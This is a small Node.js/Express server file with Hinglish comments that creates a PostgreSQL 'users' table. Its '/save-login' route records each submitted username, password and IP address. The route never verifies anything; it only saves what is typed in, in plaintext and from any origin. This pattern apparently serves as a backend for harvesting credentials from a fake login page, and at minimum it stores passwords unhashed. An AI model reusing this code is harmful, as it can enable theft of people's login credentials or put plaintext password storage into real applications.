const express = require('express');
const { Client } = require('pg');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
app.use(cors());
app.use(bodyParser.json());

// Database Connection
const client = new Client({
    user: 'postgres',        
    host: 'localhost',
    database: 'Login Page',  // <--- YAHAN CHANGE KIYA (Pehle 'postgres' tha)
    password: 'Your Pass', 
    port: 5432,
});

// Connect aur Table Check
client.connect()
    .then(async () => {
        console.log("✅ Database Connected Successfully!");
        
        // YEH LINE KHUD TABLE BANA DEGI AGAR NAHI HOGI TOH
        await client.query(`
            CREATE TABLE IF NOT EXISTS users (
                id SERIAL PRIMARY KEY,
                username VARCHAR(100),
                password VARCHAR(100),
                ip_address VARCHAR(50),
                login_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        `);
        console.log("✅ Table 'users' ready hai!");
    })
    .catch(err => console.error("❌ Connection Error (Password galat hai?):", err.message));

// Login Route
app.post('/save-login', async (req, res) => {
    const { username, password, ip } = req.body;
    console.log("New Login Attempt:", username); 

    try {
        const query = 'INSERT INTO users (username, password, ip_address) VALUES ($1, $2, $3)';
        const values = [username, password, ip];
        
        await client.query(query, values);
        console.log("Data Saved!");
        res.json({ success: true });
    } catch (err) {
        console.error("Insert Error (Table missing?):", err.message);
        res.status(500).json({ success: false });
    }
});

app.listen(3000, () => {
    console.log('🚀 Server running on http://localhost:3000');
});
